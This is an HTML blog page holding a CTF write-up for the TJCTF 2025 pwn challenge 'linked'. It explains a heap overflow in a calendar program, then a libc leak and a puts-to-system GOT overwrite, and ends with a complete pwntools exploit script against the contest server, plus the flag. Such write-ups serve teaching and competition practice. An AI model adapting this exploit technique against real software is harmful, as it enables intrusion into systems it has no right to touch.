@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="shortcut icon" href="assets/images/luffy.jpg" sizes="any">
+    <link rel="icon" href="assets/images/luffy.jpg" type="image/svg+xml">
+    <link rel="stylesheet" href="/assets/styles/global.css">
+    <title>TJCTF | linked , PWN challenge writeup | Buddurid's blog</title>
+
+    <!-- SEO Metadata -->
+    <meta property="og:title" content="TJCTF | linked , PWN challenge writeup | Buddurid's blog" />
+    <meta property="og:site_name" content="Buddurid's blog" />
+    <meta property="description" content="explanation and thought process for solving the last pwn challenge 'linked' . I played with WorldWideFlags and we got 🥉 3rd place . I also used to hate regex now i hate it even more ." />
+    <meta property="og:description" content="explanation and thought process for solving the last pwn challenge 'linked' . I played with WorldWideFlags and we got 🥉 3rd place . I also used to hate regex now i hate it even more ." />
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="http://localhost:4000/assets/images/luffy.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#FFBD3F" />
+    <link rel="canonical" href="http://localhost:4000/2025/06/07/TJCTF-2025" />
+
+    <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+
+</head>
+<body><div class="load" id="load">
+    <pre class="term" id="term">buddurid@CTF:~$ </pre>
+    <script src="/assets/splashscreen.js"></script>
+</div><nav class="open">
+    <div class="hex" role="img" aria-label="Navigation bar background graphic, styled like the address panel of a hex editor.">
+        <ol><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/></ol>
+    </div>
+    <ul>
+        <li id="splash-hack-zero-for-reference" aria-hidden="true">0</li><li >
+                <a href="/"
+                   title="Me">Me</a>
+            </li><li style="z-index: 1;">
+                <a href="/blog"
+                   title="Blog"highlighted>Blog</a>
+            </li><li >
+                <a href="/ctfs"
+                   title="CTFs">CTFs</a>
+            </li></ul>
+
+</nav>
+
+<div class="nav-toggle hamburger-container">
+    <div class="hamburger-button"></div>
+</div>
+
+
+<script>
+    const responsiveNavThreshold = 500;
+    const navOpener = document.querySelector('.nav-toggle');
+    const nav = document.querySelector('nav');
+
+    const toggle = (cl, attr) => cl.contains(attr) ? cl.remove(attr) : cl.add(attr);
+
+    navOpener.addEventListener('click', () => {
+        toggle(nav.classList, 'open');
+    });
+
+    let enabled = false;
+
+    const setResponsive = () => {
+        if (window.innerWidth < responsiveNavThreshold) {
+            if (enabled) return;
+            enabled = true;
+            nav.classList.remove('open');
+            navOpener.classList.add('enabled');
+        }
+        else {
+            if (!enabled) return;
+            enabled = false;
+            nav.classList.add('open');
+            navOpener.classList.remove('enabled');
+        }
+    };
+    setResponsive();
+    window.addEventListener('resize', setResponsive);
+</script>
+<div class="content">
+            <main>
+                <article>
+    <h1 class="post-title">TJCTF | linked , PWN challenge writeup</h1>
+    <p class="post-author-date"><b></b><em> - June 7, 2025</em></p>
+
+
+    <div class="tags">
+
+        <strong>Categories: </strong>
+
+        
+        <span>pwn</span>
+        
+        <span>linked-list</span>
+        
+        <span>GOT-table</span>
+        
+        <span>libc</span>
+        
+        <span>fuck-regex</span>
+        
+
+    </div>
+
+    <p><i>explanation and thought process for solving the last pwn challenge 'linked' . I played with WorldWideFlags and we got 🥉 3rd place . I also used to hate regex now i hate it even more .</i></p>
+
+    <hr>
+
+    <h3 id="reading-source-code-">reading source code :</h3>
+
+<p>we were provided source code for this challenge , let’s analyse it’s main components :</p>
+
+<ul>
+  <li><em>main function</em></li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">inputBuffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">'\0'</span><span class="p">};</span>
+    <span class="k">struct</span> <span class="n">eventList</span> <span class="n">events</span><span class="p">;</span>
+    <span class="n">events</span><span class="p">.</span><span class="n">head</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">event</span><span class="p">));</span>
+    <span class="n">events</span><span class="p">.</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">events</span><span class="p">.</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">time</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">events</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Add an event to your calendar:"</span><span class="p">);</span>
+
+        <span class="k">struct</span> <span class="n">event</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="n">events</span><span class="p">.</span><span class="n">head</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">cur</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">event</span><span class="p">));</span>
+        <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">time</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">events</span><span class="p">.</span><span class="n">size</span><span class="o">++</span><span class="p">;</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Event time? (1-24) "</span><span class="p">);</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+        <span class="kt">int</span> <span class="n">t</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">t</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">free</span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">);</span>
+            <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+            <span class="n">events</span><span class="p">.</span><span class="n">size</span><span class="o">--</span><span class="p">;</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"Invalid integer: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">);</span>
+            <span class="k">continue</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">cur</span><span class="o">-&gt;</span><span class="n">time</span> <span class="o">=</span> <span class="n">t</span><span class="p">;</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Event name? "</span><span class="p">);</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+        <span class="n">inpcpy</span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">);</span>
+
+        <span class="n">displayEvents</span><span class="p">(</span><span class="o">&amp;</span><span class="n">events</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">"2 events and still couldn't get the flag?"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"smhmh"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"just run like..."</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"cat flag.txt"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"or something like that"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>looks like we’re going in a loop that has 2 iterations , in each iteration we’re gonna</p>
+
+<ol>
+  <li>allocate a struct of type <code class="language-plaintext highlighter-rouge">event</code></li>
+  <li>fill this <code class="language-plaintext highlighter-rouge">event</code> object elements , maybe directly from our input or by using the <code class="language-plaintext highlighter-rouge">incpy</code> function</li>
+  <li>display the event objects created previously
+again this is just a speculation so lets dive into the rest of the code</li>
+</ol>
+
+<ul>
+  <li><em>event struct and head</em> :</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">event</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">time</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+    <span class="k">struct</span> <span class="n">event</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">eventList</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">event</span> <span class="o">*</span><span class="n">head</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<ol>
+  <li>our <code class="language-plaintext highlighter-rouge">event</code> struct looks like a typical <code class="language-plaintext highlighter-rouge">singly linked list</code> data structure , with int time and string name as it’s elements , and next being a pointer to the next <code class="language-plaintext highlighter-rouge">event</code> object in the list</li>
+  <li><code class="language-plaintext highlighter-rouge">eventList</code> is also a typical linked list head , storing the number of the linked list nodes (also called objects) and the head node .</li>
+</ol>
+
+<ul>
+  <li><em>incpy()</em>:</li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">inpcpy</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">ind</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">src</span><span class="p">[</span><span class="n">ind</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">dst</span><span class="p">[</span><span class="n">ind</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">ind</span><span class="p">];</span>
+        <span class="n">ind</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>this function is a simple <code class="language-plaintext highlighter-rouge">copy until you receive a newline</code> , very sussy and dangerous function that doesnt take into its parameters any hint about how many bytes you should copy from src to dst , so this will most probably result in a BOF .</p>
+
+<ul>
+  <li><em>displayEvents()</em></li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">displayEvents</span><span class="p">(</span><span class="k">struct</span> <span class="n">eventList</span> <span class="o">*</span><span class="n">events</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Calendar events:"</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">event</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="n">events</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">events</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">time</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%u:00 - %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">time</span><span class="p">,</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+        <span class="n">cur</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>this function prints the time (int) and the name (string) of each <code class="language-plaintext highlighter-rouge">event</code> object in our linked list .</p>
+
+<h3 id="understanding-source-code-">understanding source code :</h3>
+
+<p>now that we have somewhat of an idea about the source code , lets reread the main function to understand each line of it .</p>
+
+<ol>
+  <li>before the loop (usually setup) , we declare a head for our linked list in the variable <code class="language-plaintext highlighter-rouge">events</code> , and we immediatly allocate a node (<code class="language-plaintext highlighter-rouge">event</code> object) and we assign the head of the linked list to it</li>
+  <li>
+    <p>what happens in each iteration of the loop ?</p>
+
+    <ol>
+      <li>we go to last element in the linked list by navugating the next pointer until we reach an object where ``next==null` , in other words no next element</li>
+    </ol>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">event</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="n">events</span><span class="p">.</span><span class="n">head</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">cur</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+    <span class="p">}</span>
+
+</code></pre></div>    </div>
+
+    <ol>
+      <li>we allocate a new node and set it to the last node , so the node we’ll be interacting with will be the one allocated in setup for the first iteration , and the one allocated in first iteration for the second iteration</li>
+      <li>read a valid time integer into it , otherwise it skips this iteration</li>
+      <li>then we read a name into this stack variable <code class="language-plaintext highlighter-rouge">char inputBuffer[256]</code> with the its correct size byu using <code class="language-plaintext highlighter-rouge">sizeof(inputBuffer)</code> . this means there is no overflow right ? right this moment i asked myself these 2 questions .</li>
+    </ol>
+
+    <ul>
+      <li>our input isn’t directly read into our allocated node , its read into a stack variable . so there must a copy function used to later copy our input read from this stack variable to our node . looking a little bit further , turns out to be the <code class="language-plaintext highlighter-rouge">incpy</code> function</li>
+      <li>is the size read (in our case 256) the same as the true size of the <code class="language-plaintext highlighter-rouge">name string</code> of our node allocated ? looking at <code class="language-plaintext highlighter-rouge">char name[128];</code> in the struct definition immediatly answers our suspicion . and the answer is no , it’s much smaller than i thought (thats what she said) .</li>
+      <li>so combining our 2 questions and their answers , we get this conclusion .</li>
+    </ul>
+
+    <h4 id="we-are-reading-a-256-byte-string-then-we-gonna-copy-that-string-into-a-128-byte-string-until-we-encounter-a-newline-overflow">we are reading a 256 byte string then we gonna copy that string into a 128 byte string until we encounter a newline »&gt; OVERFLOW</h4>
+
+    <div style="text-align: center;">
+ <img src="/assets/images/hacker.jpg" alt="hacker" style="width: 500px; height: auto;" />
+ </div>
+  </li>
+  <li>the last part after was just some random messages printed with puts . BUT this looks very suspicous
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"cat flag.txt"</span><span class="p">);</span>
+</code></pre></div>    </div>
+    <p>if you’ve wasted enough time from your life on pwn , you’d probably noticed that this might be a time saviour , as overwriting the puts <em>GOT entry</em> with system would be GG , and we wont need the casual system(“/bin/sh”) that would require more setup and work . we will try to go for this approach , if you have no idea about got hijacking , these are for you <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/plt_and_got">link1</a> <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">link2</a> .</p>
+  </li>
+</ol>
+
+<h3 id="strategy-and-exploitation-">strategy and exploitation :</h3>
+
+<p>so we got our buffer overflow in the name variable , what can we do with it ?
+notice first that our file has <code class="language-plaintext highlighter-rouge">PIE</code> off</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>checksec <span class="nt">--file</span><span class="o">=</span>main
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+</code></pre></div></div>
+
+<p>this means that we know the addresses of the executable .
+so our plan is this</p>
+
+<ul>
+  <li>get libc leak , so that way we can calculate addr of <code class="language-plaintext highlighter-rouge">system</code></li>
+  <li>overwrite <code class="language-plaintext highlighter-rouge">Puts GOT entry</code> with <code class="language-plaintext highlighter-rouge">system</code> .</li>
+  <li>when <code class="language-plaintext highlighter-rouge">puts("cat flag.txt");</code> gets called , what gets executed is this <code class="language-plaintext highlighter-rouge">system("cat flag.txt");</code></li>
+</ul>
+
+<p>what you need to remember :</p>
+
+<ul>
+  <li>we have two iteration in our for loop so we’ll try to do each step in an iteration</li>
+  <li>we have a function that displays names from nodes</li>
+  <li>we know the GOT entry addresses of all functions as PIE is off</li>
+</ul>
+
+<p>small note : the program always allocates a blank node in our linked list , so the node we’ll be reading into , isnt the last one but the one before , so the layout in memory will be something similar</p>
+
+<p>————————-the node we’re reading into——————-</p>
+
+<p>——————- time: int</p>
+
+<p>——————- name : string</p>
+
+<p>——————- name : string</p>
+
+<p>——————- name : string</p>
+
+<p>——————- name : string</p>
+
+<p>——————- next1 : pointer</p>
+
+<p>————————-blank node ——————-</p>
+
+<p>——————- time: int</p>
+
+<p>——————- name : string</p>
+
+<p>——————- name : string</p>
+
+<p>——————- name : string</p>
+
+<p>——————- name : string</p>
+
+<p>——————- next2 : pointer</p>
+
+<p>what are the good targets that we can overwrite using this bof ? :</p>
+
+<ul>
+  <li>name of the blank node ? useless . no</li>
+  <li>next2 ? good start but no</li>
+  <li>heap metadata ? we dont have much control over the program so most probably no</li>
+  <li>
+    <p>next1 ? took some time but yeah . why ? suppose we overwrite it with address X . X will be the last node of the linked list instead of that blank node .
+and it’s contents will be printed , the first 4 bytes as int <code class="language-plaintext highlighter-rouge">("%d")</code> and the next bytes as string <code class="language-plaintext highlighter-rouge">("%s")</code> , why in normal case wasnt that blank node printed ?
+in fact it was trying to be printed , but as its <code class="language-plaintext highlighter-rouge">time</code> is 0 , it fails on this check</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">time</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>this gives us a very good read primitive , imagine <code class="language-plaintext highlighter-rouge">X =&amp;GOT_Puts -4 </code> , then the name attribue will be &amp;GOT_puts and it will print the &amp;Puts from libc . this would be clean but look at this</p>
+
+<p><img src="/assets/posts/TJCTF-2025/image.png" alt="img" /></p>
+
+<p>time would be the second half of <code class="language-plaintext highlighter-rouge">GOT_free</code> which is zero because the function was never called yet , so its address was still a plt entry .</p>
+
+<p>so our approach should be <code class="language-plaintext highlighter-rouge">X =&amp;GOT_Puts</code> , have the first bytes be leaked as int , and second half as raw bytes</p>
+
+<p><img src="/assets/posts/TJCTF-2025/leak.png" alt="img" /></p>
+
+<p>this would also grant us arbitrary write on this chunk , given what i explained in <em>understanding source code</em> , in the next iteration , the chunk we’ll be dealing with is the latest chunk , in other words X .</p>
+
+<p>so again we write its first 4 bytes as int (in time attribute) , and the latter 4 bytes as string (in name attribute)</p>
+
+<h3 id="solver-">solver :</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main_patched"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc tjc.tf 31509"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="c1">############### main exploit    ###############
+</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Event time? (1-24)"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">debug</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Event name? "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x84</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">puts</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="se">\x08</span><span class="s">@@</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"- "</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">|</span> <span class="p">(</span><span class="n">u16</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">-=</span><span class="mh">0x87be0</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Event time? (1-24)"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">system</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Event name? "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">system</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>thanks for sticking out this long , hope you liked this scuffed writeup and see you on the rift .</p>
+
+<p><em>tjctf{i_h0pe_my_tre3s_ar3nt_b4d_too}</em></p>
+
+<p><em>If regex has a million haters I’m one of them. If it has one hater it’s me. If it has 0 haters I have died. If the world is against regex I am with the world, if the world is for regex I am against the world.</em></p>
+
+</article>
+
+            </main><footer>
+    <div class="window-container">
+        <div class="window">
+            <div class="contacts">
+                <p><a href="https://github.com/buddurid">Github</a></p>
+                <p><a href="mailto:bbahae624@gmail.com">Email</a></p>
+                <p><a href="https://x.com/buddurid">Twitter</a></p>
+                <p><a href="https://www.linkedin.com/in/bahae-bahrini/">LinkedIn</a></p>
+                <p><a href="">Discord:#buddurid</a></p>
+                <p><a href="">CTFTime</a></p>
+            </div>
+            <p>©2024    Buddurid</p>
+            <p>Hosted on <a href="https://github.com/buddurid/buddurid.github.io/">GitHub Pages.</a></p>
+        </div>
+    </div>
+    <script src="/assets/footer-fix.js"></script>
+</footer>
+</div>
+    </body>
+</html>
